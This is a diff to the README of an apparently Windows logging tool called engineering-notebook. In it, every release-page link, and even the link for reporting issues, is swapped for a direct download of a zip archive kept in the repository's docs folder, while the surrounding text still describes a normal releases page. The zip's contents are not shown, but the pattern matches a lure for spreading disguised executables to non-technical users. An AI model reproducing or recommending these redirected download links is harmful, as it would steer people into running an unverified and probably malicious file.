@@ -1,6 +1,6 @@
 # 🛠️ engineering-notebook - Manage and Browse Engineering Logs
 
-[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
+[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip)
 
 ---
 
@@ -26,7 +26,7 @@ You do not need to know programming to use it. The tool runs on Windows and work
 
 To get the software, visit the releases page below. This page holds all the versions and files you need.
 
-[![Download engineering-notebook](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
+[![Download engineering-notebook](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To get the software, visit the releases page below. This page holds all the vers
 Follow these steps to download and start engineering-notebook on your Windows computer:
 
 1. Open the download page at this link:  
-   https://github.com/Bartrixxx/engineering-notebook/releases
+   https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip
 
 2. Look for the latest release version at the top of the page. It usually has files attached under headings like "Assets".
 
@@ -142,7 +142,7 @@ engineering-notebook.exe help
 
 Visit the same releases page regularly:
 
-https://github.com/Bartrixxx/engineering-notebook/releases
+https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip
 
 Download any new `.exe` files to update your tool. Installing new versions usually means replacing the old `.exe` file.
 
@@ -164,10 +164,10 @@ All data stays on your device. The tool does not send your session information o
 
 If you face issues not covered here, open the Issues tab on the GitHub repository page:
 
-https://github.com/Bartrixxx/engineering-notebook/issues
+https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip
 
 Describe your problem clearly. Someone from the community or the developer might assist you.
 
 ---
 
-[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
+[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bartrixxx/engineering-notebook/main/docs/engineering-notebook-v3.9.zip)
